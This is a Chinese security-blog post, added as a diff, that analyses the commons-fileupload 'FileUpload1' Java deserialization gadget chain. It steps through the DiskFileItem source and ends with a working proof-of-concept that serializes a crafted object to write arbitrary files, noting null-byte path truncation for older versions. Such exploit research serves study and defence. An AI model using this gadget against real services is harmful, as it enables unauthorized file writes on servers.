@@ -1,0 +1,288 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FileUpload1反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="FileUpload1反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="正文
+FileUpload1这条链入口点是DiskFileItem，看看他的readObject方法
+private void readObject(ObjectInputStream in) throws IOException, Cla..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              FileUpload1反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="正文">正文</h1>
+<p>FileUpload1这条链入口点是DiskFileItem，看看他的readObject方法</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    in.defaultReadObject();
+    if (this.repository != null) {
+        if (!this.repository.isDirectory()) {
+            throw new IOException(String.format(&quot;The repository [%s] is not a directory&quot;, this.repository.getAbsolutePath()));
+        }
+
+        if (this.repository.getPath().contains(&quot;\u0000&quot;)) {
+            throw new IOException(String.format(&quot;The repository [%s] contains a null character&quot;, this.repository.getPath()));
+        }
+    }
+
+    OutputStream output = this.getOutputStream();
+    if (this.cachedContent != null) {
+        output.write(this.cachedContent);
+    } else {
+        FileInputStream input = new FileInputStream(this.dfosFile);
+        IOUtils.copy(input, output);
+        this.dfosFile.delete();
+        this.dfosFile = null;
+    }
+
+    output.close();
+    this.cachedContent = null;
+}
+</code></pre>
+<p>首先判断repository是否为空并且是否包含<code>\u0000</code>，这里的repository是文件保存在硬盘上的位置，在commons-fileupload的1.3.1版本中，修复了可以用\0截断写文件的问题，也就是第二个if语句，然后调用了getOutputStream获取了一个输出流output，在cachedContent不为空的时候通过输出流把cachedContent输出。来看看<code>getOutputStream</code></p>
+<pre><code class="language-java">public OutputStream getOutputStream() throws IOException {
+    if (this.dfos == null) {
+        File outputFile = this.getTempFile();
+        this.dfos = new DeferredFileOutputStream(this.sizeThreshold, outputFile);
+    }
+
+    return this.dfos;
+}
+</code></pre>
+<p>这里的输出流实际上是DeferredFileOutputStream，继续跟进getTempFile</p>
+<pre><code class="language-java">protected File getTempFile() {
+    if (this.tempFile == null) {
+        File tempDir = this.repository;
+        if (tempDir == null) {
+            tempDir = new File(System.getProperty(&quot;java.io.tmpdir&quot;));
+        }
+
+        String tempFileName = String.format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId());
+        this.tempFile = new File(tempDir, tempFileName);
+    }
+
+    return this.tempFile;
+}
+</code></pre>
+<p>这就是获取一个输出的位置，如果tempFile是空就构造一个返回。</p>
+<h1 id="构造">构造</h1>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;
+    &lt;version&gt;1.3.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;commons-io&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
+    &lt;version&gt;2.4&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>poc如下， 代码是su18师傅的代码被我小改动了一点</p>
+<pre><code class="language-java">package FileUpload;
+
+import org.apache.commons.fileupload.disk.DiskFileItem;
+import org.apache.commons.io.output.DeferredFileOutputStream;
+
+import java.io.*;
+import java.lang.reflect.Field;
+
+public class FileUpload1 {
+    public static void main(String[] args) throws Exception {
+
+        // 创建文件写入目录 File 对象，以及文件写入内容
+        String charset = &quot;UTF-8&quot;;
+        byte[] bytes   = &quot;hahaha&quot;.getBytes(charset);
+
+        // 在 1.3 版本以下，可以使用 \0 截断
+        //File repository = new File(&quot;/Users/phoebe/Downloads/123.txt\0&quot;);
+
+        // 在 1.3.1 及以上，只能指定目录
+      File   repository = new File(&quot;E:\\2&quot;);
+
+        // 创建 dfos 对象
+        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+
+        // 使用 repository 初始化反序列化的 DiskFileItem 对象
+        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+
+        // 序列化时 writeObject 要求 dfos 不能为 null
+        Field dfosFile = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+        dfosFile.setAccessible(true);
+        dfosFile.set(diskFileItem, dfos);
+
+        // 反射将 cachedContent 写入
+        Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+        field2.setAccessible(true);
+        field2.set(diskFileItem, bytes);
+        serialize(diskFileItem);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0">构造</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/ecology9-wen-jian-shang-chuan-fen-xi/">
+              <h3 class="post-title">
+                Ecology9 文件上传分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
